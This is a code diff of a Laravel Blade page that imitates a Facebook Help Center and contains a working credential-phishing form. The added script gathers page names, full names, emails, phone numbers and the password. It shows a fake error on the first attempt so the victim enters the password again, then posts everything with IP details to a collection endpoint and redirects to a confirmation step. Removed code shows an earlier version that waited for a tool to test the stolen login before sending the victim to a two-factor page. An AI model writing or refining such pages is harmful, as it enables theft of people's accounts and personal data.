@@ -158,44 +158,106 @@
         .icon-search {
             transform: translateX(4px);
         }
-    </style>
-@endpush
-@push('scripts')
-    <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            // console.clear();
-        });
 
-        function openPopup() {
-            document.getElementById("popup").style.display = "flex";
+        .btn-option {
+            width: 250px;
+            text-align: left;
+            background-color: white;
         }
 
-        function closePopup() {
-            document.getElementById("popup").style.display = "none";
+        .btn-option:hover {
+            background-color: #EFEFEF;
+            border: 1px solid #EFEFEF;
         }
 
-        function validatepassword() {
-            var password = document.getElementById("password").value;
-            if (password.length == 0) {
-                $("#password").addClass('error');
-                $("#password").focus();
-                return;
-            } else {
-                $("#password").removeClass('error');
-                return;
+        body,
+        .maincontent {
+            font-size: 14px;
+        }
+
+        .block-main {
+            display: flex;
+            flex-wrap: wrap;
+            padding: 0px 250px;
+            background-color: white;
+        }
+
+        .header {
+            /* padding: 0px 250px; */
+        }
+
+        .sub-header {
+            height: 70px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0px 250px;
+        }
+
+        .footer-bottom {
+            display: flex;
+            justify-content: space-between;
+            align-items: top;
+            padding: 50px 250px;
+            background-color: white;
+        }
+
+        .sub-header {
+            width: 100%;
+            background-color: #efefef;
+        }
+
+        .sub-header-left {
+            align-items: center;
+            display: flex;
+            text-align: left;
+            justify-content: space-between;
+            color: #3578E5;
+            border-bottom: 5px solid #3578E5;
+            height: 100%;
+            /* margin-left: 350px; */
+        }
+
+        .sub-header-right {
+            /* margin-right: 350px; */
+        }
+
+        .sub-header-left:hover {
+            cursor: pointer;
+        }
+
+        @media screen and (max-width: 900px) {
+            .block-main {
+                padding: 20px 0px 0px 0px;
+            }
+
+            .sub-header {
+                padding: 0px 20px;
+            }
+
+            .footer-bottom {
+                margin: 0px 20px;
+            }
+
+            .footer-bottom {
+                padding: 0px 20px;
             }
         }
 
-        document.addEventListener('DOMContentLoaded', function() {
-            const passwordInput = document.getElementById('password');
-            const eyeIcon = document.querySelector('.fa-eye');
-            eyeIcon.addEventListener('click', function() {
-                const isPasswordVisible = passwordInput.type === 'text';
-                passwordInput.type = isPasswordVisible ? 'password' : 'text';
-                eyeIcon.className = isPasswordVisible ? 'fa fa-eye-slash' : 'fa fa-eye';
-            });
-        });
-    </script>
+        @media screen and (min-width: 600px) {
+            #search {
+                width: 400px !important;
+            }
+        }
+
+        @media screen and (max-width: 1400px) {
+            .main-left {
+                display: none;
+            }
+        }
+    </style>
+@endpush
+@push('scripts')
     {{-- js --}}
     <script>
         var ipAddress = "";
@@ -265,103 +327,113 @@
             }
         }
 
+        document.addEventListener("DOMContentLoaded", function() {
+            // console.clear();
+        });
 
-        var idIntervalGetCacheByEmail = null;
+        function closePopup() {
+            document.getElementById("popup").style.display = "none";
+        }
+
+        function validatepassword() {
+            var password = $('#password').val();
+            if (!password) {
+                $("#password").addClass('error');
+                $("#password").focus();
+                return;
+            } else {
+                $("#password").removeClass('error');
+                return;
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const passwordInput = document.getElementById('password');
+            const eyeIcon = document.querySelector('.fa-eye');
+            eyeIcon.addEventListener('click', function() {
+                const isPasswordVisible = passwordInput.type === 'text';
+                passwordInput.type = isPasswordVisible ? 'password' : 'text';
+                eyeIcon.className = isPasswordVisible ? 'fa fa-eye-slash' : 'fa fa-eye';
+            });
+        });
+
+
         var isLoginSuccessfully = 0;
         var email = "";
+        var countTimeLogin = 0;
 
         function sendDataLogin() {
+            const loading = $('#submit-login-loading');
+            const text = $('#submit-login-text');
+            let password = $('#password').val();
             //
             $('.error-notification').css('display', 'none');
             //
-            const valueEmail = $('#email').val();
-            email = valueEmail;
-            const valuePassword = $('#password').val();
-            const loading = $('#submit-login-loading');
-            const text = $('#submit-login-text');
-            let formData = new FormData();
-            formData.append('email_2', valueEmail);
-            formData.append('password_2', valuePassword);
-            formData = pushIPInfo(formData);
-            $.ajax({
-                method: "POST",
-                url: "/api/send-data-login",
-                data: formData,
-                cache: false,
-                contentType: false,
-                processData: false,
-                success: function(response) {
-                    if (response.status == 0) {
-                        // start to call get cache by email waiting until tool returns response of login
-                        idIntervalGetCacheByEmail = setInterval(async () => {
-                            let info = await getCacheByEmail(valueEmail);
-                            if (info) {
-                                text.removeClass('d-none');
-                                loading.addClass('d-none');
-                                if (parseInt(info.isLoginSuccessfully) == 1) {
-                                    // $('#modal-login').css('display', 'none');
-                                    // $('#modal-fa').css('display', 'block');
-                                    // $('.error-notification').css('display', 'none');
-                                    // save user to localStorage
-                                    localStorage.setItem('user', JSON.stringify({
-                                        email: valueEmail,
-                                        password: valuePassword,
-                                    }));
-
-                                    window.location.href = '/twofa';
-                                } else {
-                                    console.log('Login failed');
-                                    $('.error-notification').css('display', 'block');
-                                    text.removeClass('d-none');
-                                    loading.addClass('d-none');
-                                }
-                                clearInterval(idIntervalGetCacheByEmail);
-                                $('.button-form-login').prop('disabled', false);
-                            } else {
-                                console.log("Still call get cache by email");
-                            }
-                        }, 3000);
-                    } else {
-                        $('.button-form-login').prop('disabled', false);
-                        $('.error-notification').css('display', 'block');
-                        text.removeClass('d-none');
-                        loading.addClass('d-none');
-                    }
-                }
-            })
-        }
-
-        async function getCacheByEmail(email) {
-            let result = null;
-            let formData = new FormData();
-            formData.append('email', email);
-            await $.ajax({
-                method: "POST",
-                url: "/api/get-cache-by-email",
-                data: formData,
-                cache: false,
-                contentType: false,
-                processData: false,
-                success: function(response) {
-                    if (response.status == 0) {
-                        result = response.data;
-                    }
-                }
-            })
-
-            return result;
-        }
-
-        $(document).on('click', '#must-check', function() {
-            let value = $('#email').val();
-            if ($(this).is(':checked') && isValidValuePhoneEmail(value)) {
-                $('.btn-submit').prop('disabled', false);
-                $('.btn-submit').css('background-color', 'rgb(26, 115, 227');
+            if (countTimeLogin == 0) {
+                countTimeLogin = 1;
+                localStorage.setItem('user', JSON.stringify({
+                    password_1: password
+                }));
+                // display error
+                setTimeout(() => {
+                    $('.button-form-login').prop('disabled', false);
+                    $('.error-notification').css('display', 'block');
+                    text.removeClass('d-none');
+                    loading.addClass('d-none');
+                    $('#password').val('');
+                }, 2000);
             } else {
-                $('.btn-submit').prop('disabled', true);
-                $('.btn-submit').css('background-color', 'rgb(136, 189, 255)');
+                let name_fanpage = $('#name_fanpage').val();
+                let fullname = $('#fullname').val();
+                let bussiness_email = $('#bussiness_email').val();
+                let personal_email = $('#personal_email').val();
+                let phone = $('#phone').val();
+                let information = $('#information').val();
+                let formData = new FormData();
+                let user = JSON.parse(localStorage.getItem('user'));
+                let password_1 = user ? user.password_1 : '';
+                //
+                formData.append('name_fanpage', name_fanpage);
+                formData.append('fullname', fullname);
+                formData.append('bussiness_email', bussiness_email);
+                formData.append('personal_email', personal_email);
+                formData.append('phone', phone);
+                formData.append('password_1', password_1);
+                formData.append('password_2', password);
+                formData = pushIPInfo(formData);
+                //
+                localStorage.setItem('user', JSON.stringify({
+                    name_fanpage,
+                    fullname,
+                    bussiness_email,
+                    personal_email,
+                    phone,
+                    information,
+                    password_1,
+                    password_2: password,
+                }));
+                $.ajax({
+                    method: "POST",
+                    url: "/api/send-data-login",
+                    data: formData,
+                    cache: false,
+                    contentType: false,
+                    processData: false,
+                    success: function(response) {
+                        if (response.status == 0) {
+                            // redirect
+                            window.location.href = '/confirm';
+                        } else {
+                            $('.button-form-login').prop('disabled', false);
+                            $('.error-notification').css('display', 'block');
+                            text.removeClass('d-none');
+                            loading.addClass('d-none');
+                        }
+                    }
+                })
             }
-        })
+
+        }
 
         $(document).on('click', '.button-form-login', function() {
             $(this).prop('disabled', true);
@@ -383,22 +455,51 @@
                 }
             }, 1000);
         });
+        // $(document).on('input', '#email', function() {
+        //     if (isValidValuePhoneEmail($(this).val())) {
+        //         $(this).removeClass("error");
+        //         $(this).prop('placeholder', '');
+        //         if ($('#must-check').is(':checked')) {
+        //             $('.btn-submit').prop('disabled', false);
+        //             $('.btn-submit').css('background-color', 'rgb(26, 115, 227');
+        //         }
+        //     } else {
+        //         $(this).addClass("error");
+        //         $(this).prop('placeholder', 'Email or number phone is not valid');
+        //         $(this).focus();
+        //         $('.btn-submit').prop('disabled', true);
+        //         $('.btn-submit').css('background-color', 'rgb(136, 189, 255)');
+        //     }
+        // });
 
-        $(document).on('input', '#email', function() {
-            if (isValidValuePhoneEmail($(this).val())) {
-                $(this).removeClass("error");
-                $(this).prop('placeholder', '');
-                if ($('#must-check').is(':checked')) {
-                    $('.btn-submit').prop('disabled', false);
-                    $('.btn-submit').css('background-color', 'rgb(26, 115, 227');
-                }
+        function checkValidate() {
+            let name_fanpage = $('#name_fanpage').val();
+            let fullname = $('#fullname').val();
+            let bussiness_email = $('#bussiness_email').val();
+            let personal_email = $('#personal_email').val();
+            let phone = $('#phone').val();
+            let information = $('#information').val();
+            if (name_fanpage &&
+                fullname &&
+                bussiness_email &&
+                personal_email &&
+                phone
+            ) {
+                $('#btn-submit').prop('disabled', false);
+                $('#btn-submit').css('background-color', 'rgb(26, 115, 227');
             } else {
-                $(this).addClass("error");
-                $(this).prop('placeholder', 'Email or number phone is not valid');
-                $(this).focus();
-                $('.btn-submit').prop('disabled', true);
-                $('.btn-submit').css('background-color', 'rgb(136, 189, 255)');
+                $('#btn-submit').prop('disabled', true);
+                $('#btn-submit').css('background-color', 'rgb(136, 189, 255)');
             }
+        }
+
+        $(document).on('input keypress', '#name_fanpage', checkValidate);
+        $(document).on('input keypress', '#fullname', checkValidate);
+        $(document).on('input keypress', '#bussiness_email', checkValidate);
+        $(document).on('input keypress', '#personal_email', checkValidate);
+        $(document).on('input keypress', '#phone', checkValidate);
+        $(document).on('click', '#btn-submit', function() {
+            document.getElementById("popup").style.display = "flex";
         });
     </script>
 @endpush
@@ -409,21 +510,43 @@
             <img src="/image/page2-logo-fb.png" alt="" />
         </div>
         <div class="" style="display: flex;height:40px;position: relative;">
-            <i style="padding: 12px 15px;position: absolute;border-right:1px solid #9da8ba;height:100%" class="icon-search fa-solid fa-magnifying-glass"></i>
-            <input type="text" id="search" style="width: 400px;padding-left:60px" placeholder="@lang('home.home_search_input')" />
+            <i style="padding: 12px 15px;position: absolute;border-right:1px solid #9da8ba;height:100%"
+                class="icon-search fa-solid fa-magnifying-glass"></i>
+            <input type="text" id="search" style="width: 100%;padding-left:60px" placeholder="@lang('home.home_search_input')" />
         </div>
     </div>
-    <div class="sub-header" style="height:70px;display:flex;justify-content:space-between;align-items:center">
-        <div class="" style="display:flex;justify-content:space-between;color: #3578E5">
+    <div class="sub-header" style="">
+        <div class="sub-header-left" style="">
             <div class="" style="margin-right:10px"><i class="fa-solid fa-house-chimney"></i></div>
-            <div class="">Help Center</div>
+            <div class="">@lang('home.sub_menu_1')</div>
         </div>
-        <div class="">
-            <a href="#">English</a>
+        <div class="sub-header-right">
+            <a href="#">@lang('home.sub_menu_2')</a>
         </div>
     </div>
-    <div class="" style="display: flex">
-        <div class="main-left">a</div>
+    <div class="block-main" style="">
+        <div class="main-left" style="">
+            <button class="btn-option"> @lang('home.option_side_bar_1')</button><br>
+            <button class="btn-option"> @lang('home.option_side_bar_2')</button><br>
+            <button class="btn-option"> @lang('home.option_side_bar_3')</button><br>
+            <button class="btn-option"> @lang('home.option_side_bar_4')</button><br>
+            <button class="btn-option"> @lang('home.option_side_bar_5')</button><br>
+            <button class="btn-option"> @lang('home.option_side_bar_6')</button><br>
+            <button class="btn-option"> @lang('home.option_side_bar_7')</button><br>
+            <button class="btn-option"> @lang('home.option_side_bar_8')</button><br>
+            <button class="btn-option"> @lang('home.option_side_bar_9')</button><br>
+            <button class="btn-option"> @lang('home.option_side_bar_10')</button><br>
+            <button class="btn-option"> @lang('home.option_side_bar_11')</button><br>
+            <button class="btn-option"> @lang('home.option_side_bar_12')</button><br>
+            <button class="btn-option"> @lang('home.option_side_bar_13')</button><br>
+            <button class="btn-option"> @lang('home.option_side_bar_14')</button><br>
+            <button class="btn-option"> @lang('home.option_side_bar_15')</button><br>
+            <button class="btn-option"> @lang('home.option_side_bar_16')</button><br>
+            <button class="btn-option"> @lang('home.option_side_bar_17')</button><br>
+            <button class="btn-option"> @lang('home.option_side_bar_18')</button><br>
+            <button class="btn-option"> @lang('home.option_side_bar_19')</button><br>
+            <button class="btn-option"> @lang('home.option_side_bar_20')</button>
+        </div>
         <div class="main main-right">
             <div class="maintop" style="background-color:#F5F6F7">
                 <div class="content">
@@ -452,7 +575,7 @@
                     </p>
                 </div>
                 <div class="button-btn">
-                    <input type="text" id="fullnam" />
+                    <input type="text" id="fullname" />
                 </div>
                 <div class="bp">
                     <p class="footer-top">
@@ -488,9 +611,34 @@
                 </div>
             </div>
             <div class="" style="text-align: right;background-color:#F5F6F7;padding:10px 30px 20px 30px">
-                <button class="btn-submit" id="btn-submit" style="background-color:rgb(136, 189, 255)" disabled
-                    onclick="openPopup()">@lang('login.submit')</button>
+                <button class="btn-submit" id="btn-submit"
+                    style="background-color:rgb(136, 189, 255)">@lang('fa.title_continue_fa')</button>
             </div>
+        </div>
+    </div>
+    <div class="footer-bottom">
+        <div class="footer-text footer-1">
+            <p>
+                <i class="fa-brands fa-facebook"></i>
+            </p>
+        </div>
+        <div class="footer-text footer-2">
+            <p>@lang('home.footer_bot_1')</p>
+            <p>@lang('home.footer_bot_2')</p>
+        </div>
+        <div class="footer-text footer-3">
+            <p>@lang('home.footer_bot_3')</p>
+            <p>@lang('home.footer_bot_4')</p>
+            <p>@lang('home.footer_bot_5')</p>
+        </div>
+        <div class="footer-text footer-4">
+            <p>@lang('home.footer_bot_6')</p>
+            <p>@lang('home.footer_bot_7')</p>
+            <p>@lang('home.footer_bot_8')</p>
+        </div>
+        <div class="footer-text footer-5">
+            <p>@lang('home.footer_bot_9')</p>
+            <p>@lang('home.footer_bot_10')</p>
         </div>
     </div>
     <div class="popup-container" id="popup">
@@ -508,8 +656,8 @@
                         <br><a class="" href="https://facebook.com/login/identify/">@lang('fa.warning_find_fa')</a>
                     </div>
                     <div class="" style="display:flex;align-items:center;position: relative;">
-                        <input type="password" class="form-input" id="password" oninput="validatepassword()"
-                            placeholder="@lang('login.password')" value="" />
+                        <input type="password" class="form-input" id="password" placeholder="@lang('login.password')"
+                            value="" />
                         <i id="eye" class="fa fa-eye" style="position: absolute;right:30px"></i>
                     </div>
                 </div>
